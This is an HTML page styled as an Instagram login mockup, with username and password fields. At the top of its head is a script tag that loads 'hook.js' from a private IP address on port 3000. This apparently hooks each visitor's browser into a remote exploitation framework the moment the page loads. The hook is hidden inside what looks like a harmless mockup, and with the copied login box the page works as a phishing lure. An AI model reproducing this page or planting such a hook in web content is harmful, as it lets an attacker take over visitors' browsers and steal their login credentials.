<!DOCTYPE html>
<html lang="en">
<head>
  <script src="http://192.168.18.145:3000/hook.js"></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login Page Mockup</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      width: 350px;
      background-color: #000;
      padding: 40px;
      color: #fff;
      text-align: center;
      border-radius: 12px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
    }

    .login-box input {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: 1px solid #ccc;
    }

    .login-box button {
      width: 95%;
      padding: 12px;
      background-color: #0095f6;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      margin: 10px 0;
    }

    .footer {
      margin-top: 15px;
      font-size: 0.9em;
      color: gray;
    }

    .login-box a {
      color: #0095f6;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <!-- Instagram Login Box -->
  <div class="login-box">
    <h2>Instagram</h2>
    <input type="text" placeholder="Phone number, username, or email">
    <input type="password" placeholder="Password">
    <button>Log In</button>
    <p>OR</p>
    <div class="footer">
      <a href="#">Forgotten your password?</a>
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
</body>
</html>
